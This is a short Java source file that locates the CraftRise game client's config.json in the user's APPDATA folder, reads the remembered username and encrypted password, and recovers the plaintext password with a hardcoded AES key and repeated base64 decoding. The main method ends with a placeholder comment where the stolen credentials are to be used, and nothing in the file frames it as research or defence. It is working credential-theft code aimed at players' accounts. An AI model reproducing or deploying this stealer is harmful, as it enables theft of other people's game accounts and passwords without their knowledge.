package xyz.groax;

import com.google.common.io.BaseEncoding;
import com.google.gson.*;
import org.apache.commons.io.FileUtils;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Objects;


public class Main {
    private static final JsonParser parser = new JsonParser();

  public static void main(String[] args) throws Exception {
        File file = new File(System.getenv("appdata"), ".craftrise" + File.separator + "config.json");

        JsonObject element = parser.parse(FileUtils.readFileToString(file, "UTF-8")).getAsJsonObject();

        String user = element.get("rememberName").getAsString();

        String pass = decrypt(element.get("rememberPass").getAsString());

        //Do shit
    }
    public static String decrypt(String encryptedPass) {
        try {
            byte[] var6 = null;

            try {
                SecretKeySpec var7 = new SecretKeySpec("2640023187059250".getBytes(), "AES");
                Cipher var8 = Cipher.getInstance("AES/ECB/PKCS5Padding");
                var8.init(2, var7);
                var6 = var8.doFinal(DatatypeConverter.parseBase64Binary(encryptedPass));
            } catch (Exception var9) {
                var9.printStackTrace();
            }
            if(Objects.isNull(var6))
            {
                return "";
            }
            return decryptRiseVersion(new String(var6)).split("#")[0];
        } catch (Throwable var10) {
            var10.printStackTrace();
            return "";
        }
    }
    public static String decryptRiseVersion(String s) {
        s = decryptBase64(s);
        s = decryptBase64(s);
        if (!s.startsWith("3ebi2mclmAM7Ao2") || !s.endsWith("KweGTngiZOOj9d6")) {
            return s;
        }
        final String substring = s.substring(0, "3ebi2mclmAM7Ao2".length());
        final String substring2 = s.substring(s.length() - "KweGTngiZOOj9d6".length());
        if (!substring.equals("3ebi2mclmAM7Ao2") || !substring2.equals("KweGTngiZOOj9d6")) {
            return s;
        }
        final String substring3 = s.substring("3ebi2mclmAM7Ao2".length(), s.length() - "KweGTngiZOOj9d6".length());
        return decryptBase64(substring3);
    }

    public static String decryptBase64(final String chars)  {
        return new String(BaseEncoding.base64().decode(chars), StandardCharsets.UTF_8);
    }
}
